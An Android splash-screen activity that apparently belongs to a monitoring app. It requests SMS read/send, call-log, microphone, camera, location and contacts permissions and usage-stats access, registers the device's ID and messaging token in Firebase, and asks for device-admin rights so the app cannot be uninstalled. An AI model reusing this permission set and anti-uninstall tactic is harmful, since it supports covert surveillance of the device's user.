package app.marees.mars;

import android.Manifest;
import android.annotation.TargetApi;
import android.app.AppOpsManager;
import android.app.admin.DevicePolicyManager;
import android.app.usage.UsageStats;
import android.app.usage.UsageStatsManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.Toast;

import androidx.annotation.NonNull;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.fragment.app.FragmentActivity;
import androidx.lifecycle.ViewModelProviders;


import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.iid.FirebaseInstanceId;

import java.util.ArrayList;
import java.util.List;

import app.marees.mars.Singletons.Myapp;
import app.marees.mars.protectedservice.DeviceAdminComponent;
import app.marees.mars.room.MyViewModel;

public class Splash extends FragmentActivity implements View.OnClickListener{

    private static final int MY_PERMISSIONS_REQUEST_ACCESS_CODE = 1;
    Button usage,admin,permission,screening,internt,next;
    ProgressBar usagePro,adminPro,permissionPro,screeningPro,internetPro;
    ImageView usageImg,adminImg,permissionImg,screeningImg,internetImg;
    boolean t = true;
    private static final String TAG = "Splash";
    private static final String[] requiredPermissions = {
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.MODIFY_AUDIO_SETTINGS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_CONTACTS,

    };

    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
                                                            /////views
        setContentView(R.layout.splash);

        MyViewModel mars;
        mars = ViewModelProviders.of(this).get(MyViewModel.class);
        Myapp.setMyViewModel(mars);

        View view = findViewById(android.R.id.content);
        initViews(view);
        Myapp.setMyView(view);
        /////usage access


        ////permission
     //   checkrunTimepermission();
                                                            /////firebase key
        getFirebaseKey();
                                                            /////verify all prerequisite are given
        startPermissionVerifier();
//        if(t){
//            mars.deletAll();
//            t = false;
//        }
    }




    private void startPermissionVerifier() {
if(Myapp.getMyView() != null){
    Handler h = new Handler();
    h.postDelayed(new Runnable() {
        @Override
        public void run() {
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    ///visible next button
                    initViews(Myapp.getMyView());
                    if(checkUsageAccess() && checkPermissions() && checkAdminPermission()){
                                                        /** ALL Prerequisite Given **/
                        Toast.makeText(Splash.this, "Authorized User Welcome!!!", Toast.LENGTH_SHORT).show();
                        Intent SecondScreen = new Intent(Splash.this,HomeActivity.class);
                        startActivity(SecondScreen);
                    }
                    else{
                        next.setVisibility(View.GONE);
                        if(checkUsageAccess()){
                            usageImg.setVisibility(View.VISIBLE);
                            usagePro.setVisibility(View.GONE);
                            usage.setVisibility(View.GONE);
                        }
                        else{
                            usagePro.setVisibility(View.GONE);
                            usage.setVisibility(View.VISIBLE);
                        }
                        if(checkAdminPermission()){
                            admin.setVisibility(View.GONE);
                            adminImg.setVisibility(View.VISIBLE);
                            adminPro.setVisibility(View.GONE);
                        }
                        else{
                            adminPro.setVisibility(View.GONE);
                            admin.setVisibility(View.VISIBLE);
                        }
                        if(checkPermissions()){
                            permission.setVisibility(View.GONE);
                            permissionPro.setVisibility(View.GONE);
                            permissionImg.setVisibility(View.VISIBLE);
                        }
                        else{
                            permissionPro.setVisibility(View.GONE);
                            permission.setVisibility(View.VISIBLE);
                        }
                    }

                }
            });


        }
    },2000);
                            /////check every 5000milli
}

    }

    private boolean checkAdminPermission() {
        try {

            DevicePolicyManager policyMgr = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
            ComponentName componentName = new ComponentName(Splash.this, DeviceAdminComponent.class);

            if (!policyMgr.isAdminActive(componentName)) {
                // try to become active
             admin.setVisibility(View.GONE);
             adminPro.setVisibility(View.VISIBLE);
                                                                /////not granted admin permission
             return false;
            }
            else{
                adminImg.setVisibility(View.VISIBLE);
                adminPro.setVisibility(View.GONE);
                admin.setVisibility(View.GONE);
                                                                    /////granted admin permission
                return true;
            }
        } catch (Exception e) {
            e.printStackTrace();
            return false;
        }
    }

    private void initViews(View view) {
        next = view.findViewById(R.id.button13);
        usage = view.findViewById(R.id.button2);
        admin = view.findViewById(R.id.button3);
        permission = view.findViewById(R.id.button5);
        screening = view.findViewById(R.id.button7);
        usagePro = view.findViewById(R.id.progressBar45);
        adminPro = view.findViewById(R.id.progressBar);
        permissionPro = view.findViewById(R.id.progressBar55);
        screeningPro = view.findViewById(R.id.progressBar2);
        internetPro = view.findViewById(R.id.progressBar3);
        usageImg = view.findViewById(R.id.imageView25);
        adminImg = view.findViewById(R.id.imageView22);
        permissionImg = view.findViewById(R.id.permImg);
        screeningImg = view.findViewById(R.id.imageView23);
        internetImg = view.findViewById(R.id.imageView24);
        next.setOnClickListener(this);
        usage.setOnClickListener(this);
        admin.setOnClickListener(this);
        permission.setOnClickListener(this);
        screening.setOnClickListener(this);

    }

    private boolean checkUsageAccess() {

        if(!hasPermission(getApplicationContext())) {

                                                        ///no usage access
            usage.setVisibility(View.VISIBLE);
            return false;
        }
        usageImg.setVisibility(View.VISIBLE);           /////allowed usage acess
        return true;
    }

                                                        //////check run time permission
    @TargetApi(Build.VERSION_CODES.M)
    private boolean checkPermissions() {
        boolean b;
        final List<String> neededPermissions = new ArrayList<>();
        for (final String permissionName : requiredPermissions) {
            if (ContextCompat.checkSelfPermission(getApplicationContext(),
                    permissionName) != PackageManager.PERMISSION_GRANTED) {
                neededPermissions.add(permissionName);
                /////show permission progress
                permissionPro.setVisibility(View.VISIBLE);
                permission.setVisibility(View.GONE);
            }
        }
        if (!neededPermissions.isEmpty()) {
            requestPermissions(neededPermissions.toArray(new String[]{}),
                    MY_PERMISSIONS_REQUEST_ACCESS_CODE);
                                                                        ///one or more permission not given
                b=false;
        }
        else{

                                                                    //////all permission granted
            permissionPro.setVisibility(View.GONE);
            permission.setVisibility(View.GONE);
            permissionImg.setVisibility(View.VISIBLE);
            b = true;
        }
        return b;
    }

                                                            /////button check permission optional if u want give permission by onclick or something
    private void checkrunTimepermission() {

        ActivityCompat.requestPermissions(Splash.this,
                new String[]{ Manifest.permission.WRITE_EXTERNAL_STORAGE,
                        Manifest.permission.CAMERA,
                        Manifest.permission.READ_SMS,
                        Manifest.permission.SEND_SMS,
                        Manifest.permission.READ_CALL_LOG,
                        Manifest.permission.READ_EXTERNAL_STORAGE,
                        Manifest.permission.RECORD_AUDIO,
                        Manifest.permission.MODIFY_AUDIO_SETTINGS,
                        Manifest.permission.ACCESS_FINE_LOCATION,
                        Manifest.permission.READ_CONTACTS}, 1);


    }




    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        switch (requestCode)
        {
            case 1:
                if (grantResults.length > 0 &&
                        grantResults[0] == PackageManager.PERMISSION_GRANTED)
                {
                    if (ContextCompat.checkSelfPermission(Splash.this,
                            Manifest.permission.READ_SMS) ==  PackageManager.PERMISSION_GRANTED)
                    {
                        //     Toast.makeText(getApplicationContext(), "Permission granted", Toast.LENGTH_SHORT).show();
                    }
                }
                else
                {
                    Toast.makeText(getApplicationContext(), "No Permission granted", Toast.LENGTH_SHORT).show();
                }
                break;
        }
    }


    @Override
    protected void onResume() {
        super.onResume();
        startPermissionVerifier();
    }

    private void getFirebaseKey() {

        String android_id = Settings.Secure.getString(getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
// Write a message to the database
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        DatabaseReference myRef = database.getReference(android_id);


        String refreshedToken = FirebaseInstanceId.getInstance().getToken();
        Log.e("",refreshedToken+"");
        myRef.setValue(refreshedToken);

    }

                ///////usage access

    public boolean hasPermission(@NonNull final Context context) {
        // Usage Stats is theoretically available on API v19+, but official/reliable support starts with API v21.
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
            return false;
        }

        final AppOpsManager appOpsManager = (AppOpsManager) context.getSystemService(Context.APP_OPS_SERVICE);

        if (appOpsManager == null) {
            return false;
        }

        final int mode = appOpsManager.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), context.getPackageName());
        if (mode != AppOpsManager.MODE_ALLOWED) {
            return false;
        }

        // Verify that access is possible. Some devices "lie" and return MODE_ALLOWED even when it's not.
        final long now = System.currentTimeMillis();
        final UsageStatsManager mUsageStatsManager = (UsageStatsManager) context.getSystemService(Context.USAGE_STATS_SERVICE);
        final List<UsageStats> stats = mUsageStatsManager.queryUsageStats(UsageStatsManager.INTERVAL_DAILY, now - 1000 * 10, now);
        return (stats != null && !stats.isEmpty());
    }

    @Override
    public void onClick(View v) {
        switch (v.getId()){
            //usage
            case R.id.button2:
                Intent intent = new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS);
                startActivity(intent);
                break;
                ///admin
            case R.id.button3:
                ComponentName componentName = new ComponentName(Splash.this, DeviceAdminComponent.class);
                Intent i = new Intent(	DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,	componentName);
                i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                        "Click on Activate button to protect your application from uninstalling!");
                startActivity(i);
                break;
                ///permission
            case R.id.button5:
                            ///ask permission
                checkrunTimepermission();
                break;
                ///screening
            case R.id.button7:

                break;
                            ///next
            case R.id.button13:

                break;
        }
    }
}
